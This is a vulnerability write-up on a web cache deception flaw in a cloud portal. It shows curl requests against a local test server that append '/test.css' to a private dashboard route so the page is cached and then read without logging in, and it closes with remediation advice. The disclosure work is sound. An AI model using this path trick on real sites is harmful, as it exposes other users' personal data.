Information Disclosure via Web Cache Deception

DATE: 2026-07-27 SEVERITY: MEDIUM CATEGORY: CACHE_ATTACK / INFO_DISCLOSURE

EXECUTIVE SUMMARY

This analysis explores a Web Cache Deception (WCD) vulnerability within the AstraCloud Infrastructure Portal. The vulnerability arises when a misconfigured cache layer (CDN/Load Balancer) is tricked into storing private user dashboards as publicly accessible static files. By manipulating URL paths with static extensions, an unauthenticated attacker can leak sensitive PII, including Full Names and Organization Emails.

EXPLOITATION_POC (VIDEO)

TECHNICAL_WALKTHROUGH

The discovery was made by observing how the infrastructure's cache server identifies assets based on file extensions, while the backend application continues to serve private content regardless of the URL suffix.

1. Baseline Verification: Inspecting the dashboard while authenticated with the test account (testing@example.com). The server returns X-Cache: BYPASS for the standard dynamic route.

CURL_BASELINE_CHECK
❯ curl -I http://127.0.0.1:5000/dashboard -b "session=eyJ1c2VyX2VtYWlsIjoidGVzdGluZ0BleGFtcGxlLmNvbSJ9.amc3gQ.PAzl8uHdDz0Pejd0lZ1TbiF7R3M"
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.3
Content-Type: text/html; charset=utf-8
X-Cache: BYPASS
Vary: Cookie

2. Triggering the Cache: By appending /test.css to the endpoint, the cache layer identifies it as a static asset. The first request results in a MISS, indicating the private dashboard is being stored in the public cache.

CURL_CACHE_TRIGGER
❯ curl -I http://127.0.0.1:5000/dashboard/test.css -b "session=eyJ1c2VyX2VtYWlsIjoidGVzdGluZ0BleGFtcGxlLmNvbSJ9.amc3gQ.PAzl8uHdDz0Pejd0lZ1TbiF7R3M"
HTTP/1.1 200 OK
X-Cache: MISS
Vary: Cookie

3. Confirming Cache Storage: A subsequent request yields an X-Cache: HIT. The server is now serving the authenticated victim's dashboard content directly from the public cache.

CURL_CACHE_CONFIRMATION
❯ curl -I http://127.0.0.1:5000/dashboard/test.css -b "session=eyJ1c2VyX2VtYWlsIjoidGVzdGluZ0BleGFtcGxlLmNvbSJ9.amc3gQ.PAzl8uHdDz0Pejd0lZ1TbiF7R3M"
HTTP/1.1 200 OK
X-Cache: HIT

4. Public Data Exfiltration: Accessing the cached URL in an Incognito window (unauthenticated) successfully leaks the victim's Organization Dashboard data.

REMEDIATION_STRATEGY

To mitigate this vulnerability, it is recommended to ensure that the Cache-Control header is explicitly set to no-store, private for all authenticated pages. Additionally, the cache server should be configured to only cache files based on the actual Content-Type returned by the origin server rather than file extensions in the URL.
